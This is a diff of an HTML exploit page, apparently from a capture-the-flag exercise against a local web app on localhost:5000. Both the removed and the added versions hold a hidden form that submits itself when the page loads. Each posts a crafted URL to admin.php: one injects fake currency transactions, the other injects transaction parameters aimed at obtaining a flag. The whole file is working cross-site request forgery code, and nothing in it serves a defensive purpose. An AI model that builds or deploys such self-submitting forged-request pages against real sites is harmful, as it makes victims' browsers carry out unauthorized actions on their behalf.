@@ -1,7 +1,20 @@
-<!doctype html>
-<meta charset="utf-8">
-<form id="f" action="http://localhost:5000/admin.php" method="POST">
-  <input type="hidden" name="url"
-    value="http://localhost:5000/index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A">
-</form>
-<script>f.submit()</script>
+<!DOCTYPE html>
+<html>
+<head><title>Test</title></head>
+<body>
+    <h1 style="color:red;font-size:50px;">REDIRECT WORKED!</h1>
+    <p>Current URL: <script>document.write(window.location.href);</script></p>
+    <p>User Agent: <script>document.write(navigator.userAgent);</script></p>
+    <p>Time: <script>document.write(new Date().toISOString());</script></p>
+    
+    <h2>Now attempting exploit...</h2>
+    <form method="post" action="http://localhost:5000/admin.php" name="f">
+        <input name="url" value="http://localhost:5000/admin.php?transactions[0][amount]=1&transactions[0][country]=FLAG">
+    </form>
+    
+    <script>
+        document.write('<p style="color:blue;">JavaScript working! Submitting form now...</p>');
+        document.f.submit();
+    </script>
+</body>
+</html>
